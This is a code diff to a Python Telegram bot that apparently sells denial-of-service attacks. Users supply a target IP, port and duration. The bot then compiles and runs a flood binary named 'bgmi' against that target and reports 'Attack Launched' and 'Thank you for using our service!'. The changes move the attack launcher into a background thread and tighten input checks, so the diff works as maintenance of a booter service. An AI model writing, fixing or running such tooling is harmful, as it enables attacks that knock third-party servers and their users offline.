@@ -1,7 +1,7 @@
 import asyncio
 import os
-import signal
 import subprocess
+import threading
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
@@ -58,42 +58,50 @@ async def manage(update: Update, context: CallbackContext):
     else:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid command. Use 'add' or 'rem'*", parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, context):
-    global attack_in_progress
-    attack_in_progress = True
-
+def run_attack_sync(chat_id, ip, port, duration, context):
+    """Synchronous function to run the attack in a thread"""
+    import time
     try:
         # Make sure binary is executable
         if not os.path.exists('./bgmi'):
-            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack binary not found!*", parse_mode='Markdown')
-            return
+            return "Binary not found"
         
         os.chmod('./bgmi', 0o755)
         
-        # Run the attack
-        process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration} 10",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
+        # Run the attack using subprocess (blocking but in separate thread)
+        cmd = f"./bgmi {ip} {port} {duration} 10"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(duration) + 30)
         
-        # Wait for completion with timeout
-        try:
-            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration + 30)
-            if stdout:
-                print(f"[stdout]\n{stdout.decode()}")
-            if stderr:
-                print(f"[stderr]\n{stderr.decode()}")
-        except asyncio.TimeoutError:
-            process.kill()
-            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack timed out!*", parse_mode='Markdown')
-
+        if result.stdout:
+            print(f"[stdout]\n{result.stdout}")
+        if result.stderr:
+            print(f"[stderr]\n{result.stderr}")
+        
+        return "success"
+    except subprocess.TimeoutExpired:
+        return "timeout"
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')
+        return f"error: {str(e)}"
 
+async def run_attack_async(chat_id, ip, port, duration, context):
+    """Wrapper to run sync attack in a thread"""
+    global attack_in_progress
+    
+    try:
+        # Run the blocking attack in a separate thread
+        loop = asyncio.get_event_loop()
+        result = await loop.run_in_executor(None, run_attack_sync, chat_id, ip, port, duration, context)
+        
+        if result == "success":
+            await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+        elif result == "timeout":
+            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack timed out!*", parse_mode='Markdown')
+        else:
+            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {result}*", parse_mode='Markdown')
+    except Exception as e:
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Attack error: {str(e)}*", parse_mode='Markdown')
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -118,17 +126,19 @@ async def attack(update: Update, context: CallbackContext):
     
     # Validate inputs
     try:
-        port = int(port)
-        duration = int(duration)
-        if duration > 300:
+        port_num = int(port)
+        duration_num = int(duration)
+        if duration_num > 300:
             await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum duration is 300 seconds!*", parse_mode='Markdown')
             return
-        if port < 1 or port > 65535:
+        if port_num < 1 or port_num > 65535:
             await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid port number!*", parse_mode='Markdown')
             return
     except ValueError:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Port and duration must be numbers!*", parse_mode='Markdown')
         return
+
+    attack_in_progress = True
 
     await context.bot.send_message(chat_id=chat_id, text=(
         f"*⚔️ Attack Launched! ⚔️*\n"
@@ -137,7 +147,8 @@ async def attack(update: Update, context: CallbackContext):
         f"*🔥 Mayhem initiated! Let the battlefield ignite! 💥*"
     ), parse_mode='Markdown')
 
-    asyncio.create_task(run_attack(chat_id, ip, str(port), str(duration), context))
+    # Run attack in background
+    asyncio.create_task(run_attack_async(chat_id, ip, port, duration, context))
 
 async def status(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
@@ -151,6 +162,7 @@ def main():
     if os.path.exists('bgmi.c') and not os.path.exists('bgmi'):
         os.system('gcc -pthread -o bgmi bgmi.c')
         os.chmod('bgmi', 0o755)
+        print("✅ Compiled bgmi.c")
     
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
